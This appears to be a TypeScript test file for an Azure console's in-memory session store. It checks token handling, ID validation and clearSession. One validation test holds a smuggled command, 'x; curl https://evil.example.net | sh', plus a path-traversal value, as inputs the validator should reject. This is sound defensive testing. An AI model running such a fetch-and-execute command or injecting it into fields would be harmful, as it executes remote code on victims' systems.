import { http, HttpResponse } from 'msw'
import { ARM } from '@/test/msw/handlers'
import { server } from '@/test/msw/server'
import { armToken, graphToken, TEST_SUB, TEST_TENANT } from '@/test/helpers/fakeJwt'
import { requestLogStore } from '@/lib/http'
import { clearSession, onClearSession } from './clearSession'
import { httpClient } from './httpClient'
import { sessionStore } from './sessionStore'

describe('session store', () => {
  afterEach(() => {
    vi.restoreAllMocks()
  })

  it('keeps tokens and IDs in memory only: no storage, cookies or URL', async () => {
    const setItem = vi.spyOn(Storage.prototype, 'setItem')
    const pushState = vi.spyOn(history, 'pushState')
    const replaceState = vi.spyOn(history, 'replaceState')
    const arm = armToken()
    const graph = graphToken()

    const s = sessionStore.getState()
    s.setToken('arm', arm)
    s.setToken('graph', graph)
    s.setTenantId(TEST_TENANT)
    s.setSubscriptionId(TEST_SUB)

    server.use(http.get(`${ARM}/x`, () => HttpResponse.json({})))
    await httpClient.getJson('arm', `${ARM}/x?sub=${TEST_SUB}`)

    expect(setItem).not.toHaveBeenCalled()
    expect(pushState).not.toHaveBeenCalled()
    expect(replaceState).not.toHaveBeenCalled()
    expect(localStorage.length).toBe(0)
    expect(sessionStorage.length).toBe(0)
    expect(document.cookie).toBe('')
    for (const secret of [arm, graph, TEST_TENANT, TEST_SUB]) {
      expect(window.location.href).not.toContain(secret)
    }
    expect(sessionStore.getState()).toMatchObject({ tokens: { arm, graph }, tenantId: TEST_TENANT })
  })

  it('goes through the mocked fetch, so tests can never reach real Azure', async () => {
    sessionStore.getState().setToken('arm', armToken())
    // No handler: MSW rejects it (kind "network"). Real Azure would answer with an HTTP status instead.
    await expect(httpClient.getJson('arm', `${ARM}/unmocked-guard`)).rejects.toMatchObject({
      kind: 'network',
      status: undefined,
    })
  })

  it('normalizes pasted tokens', () => {
    const token = armToken()
    sessionStore.getState().setToken('arm', `  Bearer ${token}\n`)
    expect(sessionStore.getState().tokens.arm).toBe(token)
  })

  it('stores only valid tenant and subscription IDs', () => {
    const s = sessionStore.getState()
    expect(s.setTenantId(` ${TEST_TENANT} `)).toBe(true)
    expect(s.setSubscriptionId(TEST_SUB)).toBe(true)
    expect(sessionStore.getState()).toMatchObject({
      tenantId: TEST_TENANT,
      subscriptionId: TEST_SUB,
    })

    expect(s.setTenantId('contoso.onmicrosoft.com')).toBe(true)
    expect(sessionStore.getState().tenantId).toBe('contoso.onmicrosoft.com')

    expect(s.setTenantId('x; curl https://evil.example.net | sh')).toBe(false)
    expect(s.setSubscriptionId(`${TEST_SUB}/../..`)).toBe(false)
    expect(sessionStore.getState()).toMatchObject({ tenantId: '', subscriptionId: '' })
  })

  it('sets each API token without touching the other', () => {
    const arm = armToken()
    const graph = graphToken()
    sessionStore.getState().setToken('arm', arm)
    sessionStore.getState().setToken('graph', graph)
    sessionStore.getState().setToken('arm', '')
    expect(sessionStore.getState().tokens).toEqual({ arm: '', graph })
  })

  it('clearSession wipes tokens, IDs, the client token cache and the request log', async () => {
    sessionStore.getState().setToken('arm', armToken())
    sessionStore.getState().setSubscriptionId(TEST_SUB)
    server.use(http.get(`${ARM}/x`, () => HttpResponse.json({})))
    await httpClient.getJson('arm', `${ARM}/x`)
    expect(requestLogStore.getState().entries).toHaveLength(1)

    const resetClient = vi.spyOn(httpClient, 'reset')

    clearSession()

    expect(resetClient).toHaveBeenCalledOnce()
    expect(sessionStore.getState()).toMatchObject({
      tokens: { arm: '', graph: '' },
      tenantId: '',
      subscriptionId: '',
    })
    expect(requestLogStore.getState().entries).toHaveLength(0)
  })

  it('clearSession runs every registered handler, even when one throws', () => {
    sessionStore.getState().setTenantId(TEST_TENANT)
    const calls: string[] = []
    const offs = [
      onClearSession(() => {
        calls.push('a')
        throw new Error('boom')
      }),
      onClearSession(() => calls.push('b')),
    ]
    expect(() => {
      clearSession()
    }).toThrow(AggregateError)
    expect(calls).toEqual(['a', 'b'])
    expect(sessionStore.getState().tenantId).toBe('')

    offs.forEach((off) => {
      off()
    })
    calls.length = 0
    clearSession()
    expect(calls).toEqual([])
  })
})
